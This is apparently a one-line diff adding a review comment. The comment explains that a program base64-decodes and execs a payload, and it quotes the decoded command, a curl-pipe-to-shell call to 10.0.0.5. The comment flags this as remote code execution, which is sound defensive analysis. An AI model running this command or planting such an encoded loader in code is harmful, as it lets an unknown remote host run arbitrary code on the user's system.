@@ -1,0 +1,1 @@
+The program decodes a base64 string and runs it with exec, and the decoded text executes `os.system('curl -s http://10.0.0.5/x | sh')`. That reaches the network, downloads code we cannot read, and runs it directly on the host. This is unjudged remote code execution.
